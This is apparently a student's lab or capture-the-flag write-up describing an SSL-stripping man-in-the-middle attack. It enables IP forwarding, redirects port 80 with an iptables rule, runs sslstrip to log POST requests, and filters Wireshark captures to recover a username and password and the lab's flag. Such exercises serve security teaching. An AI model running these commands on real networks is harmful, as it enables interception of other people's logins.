First I enabled ip forwarding
sudo sh -c "echo 1 > /proc/sys/net/ipv4/ip_forward"

Add prerouting rule to redirect traffic to port 12345
$ sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 12345

Default port was 10000 (I think, but I changed it to 12345)

Now I run my ssl script from the correct folder (given) using flags for correct port, only loging the POST traffic,...

$ python2 ~/sslstrip/sslstrip.py -p -l 12345 

In wireshark, again, I can filter most of the data away with !arp flag or even:
http.request.method == "POST"
To get just the POST packets and inspect those.

See picture POST.png for the 2 captured packets going to the cs.ru.nl, which are also logged in the sslstrip.log file.

There we can se that the username is "admin" (bad), and the password is saved in the FLAG section:
username=admin&password=FLAG{HackThePlanet-FayL}

Flag: HackThePlanet-FayL

Disclaimer, for some reason it did not let me capture the traffic in wireshark in frist try so some flags might be different from
the screenshot.
